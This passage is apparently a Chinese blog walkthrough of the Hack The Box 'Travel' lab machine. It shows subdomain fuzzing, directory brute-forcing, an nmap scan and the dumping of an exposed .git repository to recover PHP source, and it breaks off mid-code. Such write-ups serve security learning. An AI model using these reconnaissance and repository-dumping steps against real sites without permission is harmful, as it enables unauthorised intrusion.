class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><span class="hljs-bullet">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br>Target: http://10.10.10.189/<br>Total requests: 3<br><br>===================================================================<br><span class="hljs-section">ID           Response   Lines    Word     Chars       Payload</span><br><span class="hljs-section">===================================================================</span><br><br>000000001:   200        144 L    458 W    5093 Ch     &quot;www&quot;<br>000000003:   403        7 L      9 W      154 Ch      &quot;blog-dev&quot;<br>000000002:   200        345 L    1408 W   24462 Ch    &quot;blog&quot;<br><br>Total time: 0.083828<br>Processed Requests: 3<br>Filtered Requests: 0<br>Requests/sec.: 35.78737<br></code></pre></td></tr></table></figure><p>跑出来的结果一样，但是如果我换一个更大的字典：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">wfuzz -c -w <span class="hljs-regexp">/usr/</span>share<span class="hljs-regexp">/seclists/</span>Discovery<span class="hljs-regexp">/DNS/</span>bitquark-subdomains-top100000.txt -u http:<span class="hljs-regexp">//</span><span class="hljs-number">10.10</span>.<span class="hljs-number">10.189</span> -H <span class="hljs-string">&quot;Host: FUZZ.travel.htb&quot;</span><br></code></pre></td></tr></table></figure><figure class="highlight markdown"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs markdown"><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><span class="hljs-bullet">*</span> Wfuzz 2.4.5 - The Web Fuzzer                         *<br><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><span class="hljs-strong">****</span><br><br>Target: http://10.10.10.189/<br>Total requests: 100000<br><br>===================================================================<br><span class="hljs-section">ID           Response   Lines    Word     Chars       Payload</span><br><span class="hljs-section">===================================================================</span><br><br>000000001:   200        144 L    458 W    5093 Ch     &quot;www&quot;<br>000000004:   200        345 L    1408 W   24462 Ch    &quot;blog&quot;<br>000000078:   200        51 L     126 W    1123 Ch     &quot;ssl&quot;<br>000099358:   403        7 L      9 W      154 Ch      &quot;blog-dev&quot;<br><span class="hljs-code">                                                          </span><br><span class="hljs-code">Total time: 387.3847</span><br><span class="hljs-code">Processed Requests: 100000  </span><br><span class="hljs-code">Filtered Requests: 99997</span><br><span class="hljs-code">Requests/sec.: 258.1412</span><br></code></pre></td></tr></table></figure><p>wfuzz又帮我枚举出了ssl的域名，那么我现在就有了四个域名：</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus">www<span class="hljs-selector-class">.travel</span><span class="hljs-selector-class">.htb</span><br>blog<span class="hljs-selector-class">.travel</span><span class="hljs-selector-class">.htb</span><br>blog-dev<span class="hljs-selector-class">.travel</span><span class="hljs-selector-class">.htb</span><br>ssl<span class="hljs-selector-class">.travel</span>.htb<br></code></pre></td></tr></table></figure><h4 id="travel-htb："><a href="#travel-htb：" class="headerlink" title="travel.htb："></a>travel.htb：</h4><p>一个简单的页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411224954837.png" alt="image-20220411224954837"  /><p>一个假按钮：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411225014041.png" alt="image-20220411225014041"  /><p>那能被我控制与目标服务器发起请求的便是这个输入框：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411225140724.png" alt="image-20220411225140724"  /><p>我右键检查看不出它提交到了哪个文件，用的什么脚本语言。我决定用Burpsuite抓包：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411225349976.png" alt="image-20220411225349976"  /><p>有意思的是当我疯狂点击提交时，它并不会对目标发起任何请求，但是会校验我输入的参数符合不符合规范，看起来是前端校验：</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">GET</span> <span class="hljs-string">/?email=sadas%40admin.com</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>www.travel.htb<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8<br><span class="hljs-attribute">Accept-Language</span><span class="hljs-punctuation">: </span>zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">DNT</span><span class="hljs-punctuation">: </span>1<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Referer</span><span class="hljs-punctuation">: </span>http://www.travel.htb/<br><span class="hljs-attribute">Upgrade-Insecure-Requests</span><span class="hljs-punctuation">: </span>1<br></code></pre></td></tr></table></figure><p>好吧，通过Get方式提交到当前默认页面，提交之后页面并不会发生任何变化，就好比我刚刚做的事情目标根本不理睬我。或许我应该试着去做一次路径爆破：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">dirsearch -u http:<span class="hljs-regexp">//</span>www.travel.htb<br></code></pre></td></tr></table></figure><figure class="highlight less"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs less"><br>  <span class="hljs-selector-tag">_</span>|. <span class="hljs-selector-tag">_</span> <span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">_</span>  <span class="hljs-selector-tag">_</span> <span class="hljs-selector-tag">_</span>|<span class="hljs-selector-tag">_</span>    <span class="hljs-selector-tag">v0</span><span class="hljs-selector-class">.4</span><span class="hljs-selector-class">.2</span>                                                                                     <br> (_||| _) (/<span class="hljs-built_in">_</span>(_|| (_| )                                                                                              <br>                                                                                                                     <br><span class="hljs-attribute">Extensions</span>: php, aspx, jsp, html, js | HTTP <span class="hljs-attribute">method</span>: GET | <span class="hljs-attribute">Threads</span>: <span class="hljs-number">30</span> | Wordlist <span class="hljs-attribute">size</span>: <span class="hljs-number">10927</span><br><br>Output <span class="hljs-attribute">File</span>: /root/.dirsearch/reports/www.travel.htb/_22-<span class="hljs-number">04</span>-<span class="hljs-number">11</span>_22-<span class="hljs-number">58</span>-<span class="hljs-number">52</span>.txt<br><br>Error <span class="hljs-attribute">Log</span>: /root/.dirsearch/logs/errors-<span class="hljs-number">22</span>-<span class="hljs-number">04</span>-<span class="hljs-number">11</span>_22-<span class="hljs-number">58</span>-<span class="hljs-number">52</span>.log<br><br><span class="hljs-attribute">Target</span>: <span class="hljs-attribute">http</span>:<span class="hljs-comment">//www.travel.htb/</span><br><br>[<span class="hljs-number">22</span>:<span class="hljs-number">58</span>:<span class="hljs-number">52</span>] <span class="hljs-attribute">Starting</span>: <br>[<span class="hljs-number">22</span>:<span class="hljs-number">58</span>:<span class="hljs-number">54</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">170</span>B  - /js  -&gt;  <span class="hljs-attribute">http</span>:<span class="hljs-comment">//www.travel.htb/js/               </span><br>[<span class="hljs-number">22</span>:<span class="hljs-number">59</span>:<span class="hljs-number">27</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">170</span>B  - /css  -&gt;  <span class="hljs-attribute">http</span>:<span class="hljs-comment">//www.travel.htb/css/              </span><br>[<span class="hljs-number">22</span>:<span class="hljs-number">59</span>:<span class="hljs-number">35</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">170</span>B  - /img  -&gt;  <span class="hljs-attribute">http</span>:<span class="hljs-comment">//www.travel.htb/img/              </span><br>[<span class="hljs-number">22</span>:<span class="hljs-number">59</span>:<span class="hljs-number">35</span>] <span class="hljs-number">200</span> -    <span class="hljs-number">5</span>KB - /index.html                                       <br>[<span class="hljs-number">22</span>:<span class="hljs-number">59</span>:<span class="hljs-number">37</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">556</span>B  - /js/                                              <br>[<span class="hljs-number">22</span>:<span class="hljs-number">59</span>:<span class="hljs-number">37</span>] <span class="hljs-number">403</span> -  <span class="hljs-number">556</span>B  - /lib/                                             <br>[<span class="hljs-number">22</span>:<span class="hljs-number">59</span>:<span class="hljs-number">37</span>] <span class="hljs-number">301</span> -  <span class="hljs-number">170</span>B  - /lib  -&gt;  <span class="hljs-attribute">http</span>:<span class="hljs-comment">//www.travel.htb/lib/              </span><br>                                                                             <br>Task Completed         <br></code></pre></td></tr></table></figure><p>都是403：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411230114083.png" alt="image-20220411230114083"  /><p>可以换另一款试试：</p><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section">└─# gobuster dir -u http://www.travel.htb -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40 </span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.1.0<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:                     http://www.travel.htb<br>[+] Method:                  GET<br>[+] Threads:                 40<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2022/04/11 23:03:04 Starting gobuster in directory enumeration mode<br>===============================================================<br>/img                  (Status: 301) [Size: 170] [--&gt; http://www.travel.htb/img/]<br>/css                  (Status: 301) [Size: 170] [--&gt; http://www.travel.htb/css/]<br>/lib                  (Status: 301) [Size: 170] [--&gt; http://www.travel.htb/lib/]<br>/js                   (Status: 301) [Size: 170] [--&gt; http://www.travel.htb/js/] <br>/newsfeed             (Status: 301) [Size: 170] [--&gt; http://www.travel.htb/newsfeed/]<br></code></pre></td></tr></table></figure><p>&#x2F;newsfeed一样403。</p><p>https是另一个页面，但是什么都没有：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220411230756415.png" alt="image-20220411230756415"  /><h4 id="blog-travel-htb："><a href="#blog-travel-htb：" class="headerlink" title="blog.travel.htb："></a>blog.travel.htb：</h4><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220412124222820.png" alt="image-20220412124222820"  /><p>第二个页面是wordpress框架搭建的个人博客站点，它的页面存在很多元素，在我点击时都会与目标交互产生大量请求，我可以运行 wpscan 来检查配置备份等低效成果，但我没有发现任何有趣的东西。只有一个管理员帐户。然后还有一个登录页面：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220412130025768.png" alt="image-20220412130025768"  /><p>无弱口令，无账户，存在用户名枚举漏洞，我没测出SQL注入，我准备先将其放到一旁。</p><p>对了我还在右键源代码中发现了一条奇怪的注释：</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220412151854654.png" alt="image-20220412151854654"  /><h4 id="blog-dev-travel-htb："><a href="#blog-dev-travel-htb：" class="headerlink" title="blog-dev.travel.htb："></a>blog-dev.travel.htb：</h4><p>第三个页面，打开很奇怪，</p><img src="https://raw.githubusercontent.com/Crazyinside/blog.image/main/Oldimage/image-20220412130337377.png" alt="image-20220412130337377"  /><figure class="highlight asciidoc"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs asciidoc"><span class="hljs-section"># gobuster dir -u http://blog-dev.travel.htb/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t 40</span><br><span class="hljs-section">===============================================================</span><br>Gobuster v3.1.0<br><span class="hljs-section">by OJ Reeves (@TheColonial) &amp; Christian Mehlmauer (@firefart)</span><br><span class="hljs-section">===============================================================</span><br>[+] Url:                     http://blog-dev.travel.htb/<br>[+] Method:                  GET<br>[+] Threads:                 40<br>[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt<br>[+] Negative Status codes:   404<br>[+] User Agent:              gobuster/3.1.0<br>[+] Timeout:                 10s<br>===============================================================<br>2022/04/12 13:04:08 Starting gobuster in directory enumeration mode<br>===============================================================<br><span class="hljs-section">                                  </span><br><span class="hljs-section">===============================================================</span><br><span class="hljs-section">2022/04/12 13:19:31 Finished</span><br><span class="hljs-section">===============================================================</span><br></code></pre></td></tr></table></figure><p>而且它什么都没有，我使用nmap又帮我扫了一下：</p><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs livecodeserver">└─<span class="hljs-comment"># nmap -p 80 -sC -sV blog-dev.travel.htb</span><br>Nmap scan report <span class="hljs-keyword">for</span> blog-dev.travel.htb (<span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span>)<br>Host is up (<span class="hljs-number">0.15</span>s latency).<br>rDNS record <span class="hljs-keyword">for</span> <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span>: www.travel.htb<br><br>PORT   STATE SERVICE VERSION<br><span class="hljs-number">80</span>/tcp <span class="hljs-built_in">open</span>  <span class="hljs-keyword">http</span>    nginx <span class="hljs-number">1.17</span><span class="hljs-number">.6</span><br>|<span class="hljs-title">_http-server-header</span>: nginx/<span class="hljs-number">1.17</span><span class="hljs-number">.6</span><br>| <span class="hljs-keyword">http</span>-git: <br>|   <span class="hljs-number">10.10</span><span class="hljs-number">.10</span><span class="hljs-number">.189</span>:<span class="hljs-number">80</span>/.git/<br>|     Git repository found!<br>|     Repository description: Unnamed repository; edit this <span class="hljs-built_in">file</span> <span class="hljs-string">&#x27;description&#x27;</span> <span class="hljs-built_in">to</span> name <span class="hljs-keyword">the</span>...<br>|_    Last commit message: moved <span class="hljs-built_in">to</span> git <br>|<span class="hljs-title">_http-title</span>: <span class="hljs-number">403</span> Forbidden<br><br>Service detection performed. Please report <span class="hljs-keyword">any</span> incorrect results <span class="hljs-keyword">at</span> <span class="hljs-keyword">https</span>://nmap.org/submit/ .<br>Nmap done: <span class="hljs-number">1</span> IP address (<span class="hljs-number">1</span> host up) scanned <span class="hljs-keyword">in</span> <span class="hljs-number">16.21</span> <span class="hljs-built_in">seconds</span><br></code></pre></td></tr></table></figure><p>我觉得可以把它都给克隆下来：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-comment"># ./gitdumper.sh http://blog-dev.travel.htb/.git/ git</span><br><span class="hljs-comment">###########</span><br><span class="hljs-comment"># GitDumper is part of https://github.com/internetwache/GitTools</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Developed and maintained by @gehaxelt from @internetwache</span><br><span class="hljs-comment">#</span><br><span class="hljs-comment"># Use at your own risk. Usage might be illegal in certain circumstances. </span><br><span class="hljs-comment"># Only for educational purposes!</span><br><span class="hljs-comment">###########</span><br><br><br>[*] Destination folder does not exist<br>[+] Creating git<span class="hljs-regexp">/.git/</span><br>[+] Downloaded: HEAD<br>[-] Downloaded: objects<span class="hljs-regexp">/info/</span>packs<br>[+] Downloaded: description<br>[+] Downloaded: config<br>[+] Downloaded: COMMIT_EDITMSG<br>[+] Downloaded: index<br>[-] Downloaded: packed-refs<br>[+] Downloaded: refs<span class="hljs-regexp">/heads/m</span>aster<br>[-] Downloaded: refs<span class="hljs-regexp">/remotes/</span>origin/HEAD<br>[-] Downloaded: refs/stash<br>[+] Downloaded: logs/HEAD<br>[+] Downloaded: logs<span class="hljs-regexp">/refs/</span>heads/master<br>[-] Downloaded: logs<span class="hljs-regexp">/refs/</span>remotes<span class="hljs-regexp">/origin/</span>HEAD<br>[-] Downloaded: info/refs<br>[+] Downloaded: info/exclude<br>[-] Downloaded: <span class="hljs-regexp">/refs/</span>wip<span class="hljs-regexp">/index/</span>refs<span class="hljs-regexp">/heads/m</span>aster<br>[-] Downloaded: <span class="hljs-regexp">/refs/</span>wip<span class="hljs-regexp">/wtree/</span>refs<span class="hljs-regexp">/heads/m</span>aster<br>[+] Downloaded: objects<span class="hljs-regexp">/03/</span><span class="hljs-number">13850</span>ae948d71767aff2cc8cc0f87a0feeef63<br>[-] Downloaded: objects<span class="hljs-regexp">/00/</span><span class="hljs-number">00000000000000000000000000000000000000</span><br>[+] Downloaded: objects<span class="hljs-regexp">/b0/</span><span class="hljs-number">2</span>b083f68102c4d62c49ed3c99ccbb31632ae9f<br>[+] Downloaded: objects<span class="hljs-regexp">/ed/</span><span class="hljs-number">116</span>c7c7c51645f1e8a403bcec44873f74208e9<br>[+] Downloaded: objects<span class="hljs-regexp">/2b/</span><span class="hljs-number">1869</span>f5a2d50f0ede787af91b3ff376efb7b039<br>[+] Downloaded: objects<span class="hljs-regexp">/30/</span>b6f36ec80e8bc96451e47c49597fdd64cee2da<br></code></pre></td></tr></table></figure><p>可以看到目标是PHP环境：</p><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs 1c">└─<span class="hljs-meta"># cat index</span><br>DIRC^���\�^���\�<br>\:�����l<span class="hljs-string">||Qd_�@;��Hs��  README.md^���-�rc^���-�rc</span><br>\&lt;����<br>      �+▒i����xz��vﷰ<span class="hljs-number">9</span>rss_template.php^�<span class="hljs-string">|�UH]^�I�;]�X</span><br>\=����k0��n���dQ�<span class="hljs-string">|IY�d���</span><br>                         template.phpTREE3 <span class="hljs-number">0</span><br>q�w&lt;q�<span class="hljs-string">&quot;��g��i@                            </span><br></code></pre></td></tr></table></figure><p>我又发现了一个邮箱：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs awk">┌──(root㉿Android)-[<span class="hljs-regexp">/home/</span>…<span class="hljs-regexp">/.git/</span>logs<span class="hljs-regexp">/refs/</span>heads]<br>└─<span class="hljs-comment"># cat master </span><br><span class="hljs-number">0000000000000000000000000000000000000000</span> <span class="hljs-number">0313850</span>ae948d71767aff2cc8cc0f87a0feeef63 jane &lt;jane@travel.htb&gt; <span class="hljs-number">1587458094</span> -<span class="hljs-number">0700</span>       commit (initial): moved to git<br><br></code></pre></td></tr></table></figure><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs cpp">└─<span class="hljs-meta"># git status</span><br>位于分支 master<br>尚未暂存以备提交的变更：<br>  （使用 <span class="hljs-string">&quot;git add/rm &lt;文件&gt;...&quot;</span> 更新要提交的内容）<br>  （使用 <span class="hljs-string">&quot;git restore &lt;文件&gt;...&quot;</span> 丢弃工作区的改动）<br>        删除：     README.md<br>        删除：     rss_template.php<br>        删除：     <span class="hljs-keyword">template</span>.php<br><br>修改尚未加入提交（使用 <span class="hljs-string">&quot;git add&quot;</span> 和/或 <span class="hljs-string">&quot;git commit -a&quot;</span>）<br></code></pre></td></tr></table></figure><p>可以看到有三个文件近期被删除。可以通过以下方式取回：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-comment"># git checkout -- .</span><br>                                                                                                        <br>┌──(root㉿Android)-[<span class="hljs-regexp">/home/</span>…<span class="hljs-regexp">/toolbox/</span>GitTools<span class="hljs-regexp">/Dumper/gi</span>t]<br>└─<span class="hljs-comment"># ls</span><br>README.md  rss_template.php  template.php<br><br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs awk">└─<span class="hljs-comment"># cat README.md </span><br><span class="hljs-comment"># Rss Template Extension</span><br><br>Allows rss-feeds to be shown on a custom wordpress page.<br><br><span class="hljs-comment">## Setup</span><br><br>* `git clone https:<span class="hljs-regexp">//gi</span>thub.com<span class="hljs-regexp">/WordPress/</span>WordPress.git`<br>* copy rss_template.php &amp; template.php to `wp-content<span class="hljs-regexp">/themes/</span>twentytwenty` <br>* create logs directory <span class="hljs-keyword">in</span> `wp-content<span class="hljs-regexp">/themes/</span>twentytwenty` <br>* create page <span class="hljs-keyword">in</span> backend and choose rss_template.php as theme<br><br><span class="hljs-comment">## Changelog</span><br><br>- temporarily disabled cache compression<br>- added additional security checks <br>- added caching<br>- added rss template<br><br><span class="hljs-comment">## ToDo</span><br><br>- finish logging implementation <br></code></pre></td></tr></table></figure><p>目标添加了rss模板。对应的是这个路径：</p><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk">http:<span class="hljs-regexp">//</span>blog.travel.htb<span class="hljs-regexp">/wp-content/</span>themes<span class="hljs-regexp">/twentytwenty/</span>template.php<br></code></pre></td></tr></table></figure><p>那么我现在可能是获取到了目标这两个php脚本的源码。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br></pre></td><td class="code"><pre><code class="hljs php">└─<span class="hljs-comment"># cat rss_template.php </span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">Template Name: Awesome RSS</span><br><span class="hljs-comment">*/</span><br><span class="hljs-keyword">include</span>(<span class="hljs-string">&#x27;template.php&#x27;</span>);<br><span class="hljs-title function_ invoke__">get_header</span>();<br><span class="hljs-meta">?&gt;</span><br><br>&lt;main <span class="hljs-class"><span class="hljs-keyword">class</span>=&quot;<span class="hljs-title">section</span>-<span class="hljs-title">inner</span>&quot;&gt;</span><br><span class="hljs-class">&lt;?<span class="hljs-title">php</span></span><br><span class="hljs-class"><span class="hljs-title">function</span> <span class="hljs-title">get_feed</span>($<span 